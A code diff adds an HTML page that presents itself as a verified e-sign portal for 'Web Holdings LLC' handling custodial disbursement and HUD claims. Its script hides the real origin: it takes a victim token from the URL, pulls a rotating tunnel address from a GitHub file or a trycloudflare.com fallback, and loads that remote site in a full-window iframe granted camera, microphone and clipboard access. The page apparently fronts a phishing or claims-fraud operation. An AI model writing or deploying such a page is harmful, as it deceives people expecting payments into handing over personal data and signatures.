@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <meta name="referrer" content="no-referrer" />
+  <title>Web Holdings LLC — Secure Custodial Disbursement E-Sign Portal</title>
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+  <style>
+    * { box-sizing: border-box; }
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: #f1f5f9;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      color: #0f172a;
+      display: flex;
+      flex-direction: column;
+    }
+    .wh-topbar {
+      background: #0f172a;
+      color: #f8fafc;
+      padding: 8px 14px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      font-size: 12.5px;
+      border-bottom: 2px solid #059669;
+      flex: 0 0 auto;
+      z-index: 10;
+    }
+    .wh-brand {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-weight: 700;
+      letter-spacing: 0.1px;
+      flex-wrap: wrap;
+    }
+    .wh-brand a {
+      color: #34d399;
+      text-decoration: none;
+    }
+    .wh-fallback {
+      color: #e2e8f0;
+      background: #1e293b;
+      border: 1px solid #334155;
+      padding: 4px 10px;
+      border-radius: 6px;
+      text-decoration: none;
+      font-size: 11.5px;
+      font-weight: 600;
+      white-space: nowrap;
+    }
+    .wh-fallback:hover {
+      background: #334155;
+      color: #ffffff;
+    }
+    .wh-frame-wrap {
+      position: relative;
+      flex: 1 1 auto;
+      width: 100%;
+      height: 100%;
+      background: #f1f5f9;
+    }
+    iframe {
+      border: none;
+      width: 100%;
+      height: 100%;
+      display: block;
+    }
+    .wh-loading {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background: #f8fafc;
+      color: #0f172a;
+      padding: 24px;
+      text-align: center;
+    }
+    .spinner {
+      width: 34px;
+      height: 34px;
+      border: 3px solid #cbd5e1;
+      border-top-color: #059669;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 12px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="wh-topbar">
+    <div class="wh-brand">
+      <span>&#128274; Web Holdings LLC &bull; Verified SSL E-Sign Portal (webholdingsmi.com) &bull;</span>
+      <a href="tel:2489961874">(248) 996-1874</a>
+    </div>
+    <a id="openFullBtn" class="wh-fallback" href="#" target="_blank" rel="noopener">Open Full Screen &#8599;</a>
+  </div>
+  <div class="wh-frame-wrap">
+    <div id="loadingState" class="wh-loading">
+      <div class="spinner"></div>
+      <div style="font-weight:700;font-size:15px;">Connecting to Secure Web Holdings E-Sign Session&hellip;</div>
+      <div style="font-size:12.5px;color:#64748b;margin-top:4px;">Need help? Call or text Adriano Vagnini at (248) 996-1874</div>
+    </div>
+    <iframe id="esignFrame" allow="camera; microphone; clipboard-read; clipboard-write" style="display:none;"></iframe>
+  </div>
+  <script>
+    (async function () {
+      const FALLBACK_BASE = "https://michelle-weekends-phys-hazardous.trycloudflare.com";
+      const params = new URLSearchParams(window.location.search);
+      let mode = "claim";
+      let token = params.get("hud") || "";
+      if (token) {
+        mode = "hud";
+      } else {
+        token = params.get("id") || params.get("token") || "";
+      }
+
+      if (!token) {
+        const pathParts = (window.location.pathname || "").split("/").filter(Boolean);
+        if (pathParts.length >= 2 && (pathParts[0] === "claim-sign" || pathParts[0] === "sign" || pathParts[0] === "hud-sign")) {
+          mode = pathParts[0] === "hud-sign" ? "hud" : "claim";
+          token = decodeURIComponent(pathParts[1]);
+        } else if (window.location.hash && window.location.hash.length > 1) {
+          token = decodeURIComponent(window.location.hash.replace(/^#\/?/, ""));
+        }
+      }
+
+      if (!token) {
+        document.getElementById("loadingState").innerHTML =
+          '<div style="max-width:460px;"><h2>Web Holdings LLC &mdash; Claim Portal</h2>' +
+          '<p style="color:#475569;">Please use the personalized agreement link sent to your email or phone, or look up your reference code on our client portal.</p>' +
+          '<a href="/portal.html" style="display:inline-block;margin-top:10px;padding:10px 18px;background:#059669;color:#fff;border-radius:8px;text-decoration:none;font-weight:700;">Open Client Reference Portal</a></div>';
+        document.getElementById("openFullBtn").style.display = "none";
+        return;
+      }
+
+      const cleanUrl = (mode === "hud" ? "/hud-sign/" : "/claim-sign/") + encodeURIComponent(token);
+      try {
+        window.history.replaceState(null, "", cleanUrl);
+      } catch (_) {}
+
+      let base = FALLBACK_BASE;
+      const sources = [
+        "https://raw.githubusercontent.com/drcinc340/webholdingsmi/main/tunnel.json?t=" + Date.now(),
+        "/tunnel.json?t=" + Date.now()
+      ];
+      for (const src of sources) {
+        try {
+          const res = await fetch(src, { cache: "no-store" });
+          if (res.ok) {
+            const data = await res.json();
+            if (data && data.tunnelUrl && data.tunnelUrl.startsWith("https://")) {
+              base = data.tunnelUrl.replace(/\/+$/, "");
+              break;
+            }
+          }
+        } catch (_) {}
+      }
+
+      const routePrefix = mode === "hud" ? "/hud-sign/" : "/claim-sign/";
+      const targetUrl = base + routePrefix + encodeURIComponent(token);
+
+      const fullBtn = document.getElementById("openFullBtn");
+      fullBtn.href = targetUrl;
+
+      const frame = document.getElementById("esignFrame");
+      const loading = document.getElementById("loadingState");
+      frame.addEventListener("load", function () {
+        loading.style.display = "none";
+        frame.style.display = "block";
+      });
+      frame.src = targetUrl;
+      setTimeout(function () {
+        if (frame.style.display === "none") {
+          loading.style.display = "none";
+          frame.style.display = "block";
+        }
+      }, 2500);
+    })();
+  </script>
+</body>
+</html>
